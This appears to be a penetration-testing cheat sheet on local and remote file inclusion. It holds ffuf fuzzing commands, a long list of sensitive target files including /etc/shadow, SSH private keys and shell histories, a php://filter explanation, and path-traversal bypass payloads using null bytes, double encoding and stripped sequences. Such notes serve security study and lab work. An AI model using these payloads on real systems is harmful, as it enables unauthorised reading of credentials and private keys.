# LFI / RFI

## Useful Links

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}

{% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}

##

## &#x20;Find other php pages

**Kali**

```
ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w SecLists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt > results.txt
cat results.txt | grep -v 2422
```



## Find system level files

Can use the list below to fill mylist.txt

**Kali**

```
ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w mylist.txt > results.txt
cat results.txt | grep -v 2422
```



## Places to look if LFI is possible

| Location                    | Description                                                                                                                                                       |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/issue                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | contains information about the system's users' passwords                                                                                                          |
| /root/.bash\_history        | contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id\_rsa          | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache webserver                                                                                                                        |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                        |
|                             |                                                                                                                                                                   |



Another good list of places to check if possible

```
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/.htpasswd
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```



**Copy cheat sheet**

[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)



**PHP://** is a wrapper for Accessing various I/O streams. We&#x20;

**php://filter** — it is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. There are multiple parameters to this wrapper, we will use **convert.base64-encode/resource=** — This will convert the given file into base64 encoding and print it on screen. But we have to provide the resource what we want to read like a file name **index.php**.



**Bypasses**

<table><thead><tr><th>Bypass</th><th width="184.33333333333331">Explanation</th><th width="366.66666666666674">Example</th></tr></thead><tbody><tr><td>Bypass extension added</td><td>Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.</td><td>hxxp://10.10.230.14/lab3.php?file=../../../../../etc/passwd%00</td></tr><tr><td>PHP removing slashes</td><td>This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass.</td><td>hxxp://10.10.230.14/lab3.php?file=..//..//..//..//..//etc/passwd</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>

### traversal sequences stripped non-recursively

```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

### **Null byte (%00)**

Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### **Encoding**

You could use non-standard encondings like double URL encode (and others):

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### From existent folder

Maybe the back-end is checking the folder path:

```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

## LFI to RCE via Apache Log File Poisoning (PHP) <a href="#user-content-lfi-to-rce-via-apache-log-file-poisoning-php" id="user-content-lfi-to-rce-via-apache-log-file-poisoning-php"></a>

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

